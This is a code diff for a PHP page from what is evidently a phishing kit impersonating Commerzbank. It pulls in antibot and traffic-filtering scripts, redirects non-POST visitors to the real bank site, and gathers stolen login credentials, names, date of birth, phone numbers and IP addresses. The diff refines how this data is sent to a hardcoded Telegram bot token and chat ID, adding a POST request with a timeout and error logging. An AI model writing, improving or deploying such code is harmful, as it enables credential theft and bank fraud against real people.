@@ -1,9 +1,12 @@
 <?php
 
-
 include '../antibot.php';
 include '../antibot/tds.php';
 
+// Start session only once at the beginning
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
+}
 
 function currentTime() {
     return time();
@@ -14,7 +17,7 @@ function checkAccess() {
     $maxConnections = 5;
     $timeFrame = 5 * 60;
 
-    $userIP = $_SERVER['REMOTE_ADDR'];
+    $userIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 
     if (!isset($_SESSION['connection_data'])) {
         $_SESSION['connection_data'] = [];
@@ -40,28 +43,27 @@ if (checkAccess()) {
  
 
  <?php
-session_start();
  
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $_SESSION['xname1'] = $_POST['xname1'];
-    $_SESSION['xname2'] = $_POST['xname2'];
-    $_SESSION['xdob'] = $_POST['xdob'];
-    $_SESSION['xtel'] = $_POST['xtel'];
+    $_SESSION['xname1'] = $_POST['xname1'] ?? '';
+    $_SESSION['xname2'] = $_POST['xname2'] ?? '';
+    $_SESSION['xdob'] = $_POST['xdob'] ?? '';
+    $_SESSION['xtel'] = $_POST['xtel'] ?? '';
 } else {
     header('Location: https://www.commerzbank.de/');
     exit();
 }
  
  
-$xusr = $_SESSION['xusr'];
-$xpss = $_SESSION['xpss'];
-$xusr1 = $_SESSION['xusr1'];
-$xpss1 = $_SESSION['xpss1'];
-$xname1 = $_SESSION['xname1'];
-$xname2 = $_SESSION['xname2'];
-$xdob = $_SESSION['xdob'];
-$xtel = $_SESSION['xtel'];
-$ipAddress = $_SERVER['REMOTE_ADDR']; 
+$xusr = $_SESSION['xusr'] ?? '';
+$xpss = $_SESSION['xpss'] ?? '';
+$xusr1 = $_SESSION['xusr1'] ?? '';
+$xpss1 = $_SESSION['xpss1'] ?? '';
+$xname1 = $_SESSION['xname1'] ?? '';
+$xname2 = $_SESSION['xname2'] ?? '';
+$xdob = $_SESSION['xdob'] ?? '';
+$xtel = $_SESSION['xtel'] ?? '';
+$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown'; 
 
 $token = '8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q'; // Replace with your bot token
 $chatId = '-4667150929';   // Replace with your chat ID
@@ -75,7 +77,31 @@ $message .= "📱 |  𝗣𝗵𝗼𝗻𝗲: $xtel\n";
 $message .= "\n";
 $message .= "📍 |  𝗜𝗣 𝗔𝗱𝗿𝗲𝘀𝘀: $ipAddress";
  
-$response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($message));
+// Use optimized Telegram API call with timeout
+$url = "https://api.telegram.org/bot$token/sendMessage";
+$data = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+];
+
+$options = [
+    'http' => [
+        'method' => 'POST',
+        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+        'content' => http_build_query($data),
+        'timeout' => 5, // 5 second timeout for faster response
+        'ignore_errors' => true // Don't throw errors on HTTP errors
+    ]
+];
+
+$context = stream_context_create($options);
+$response = @file_get_contents($url, false, $context);
+
+// Log the response for debugging
+if ($response === false) {
+    error_log("Telegram API call failed for chat ID: $chatId");
+}
 
 session_destroy();
 ?>
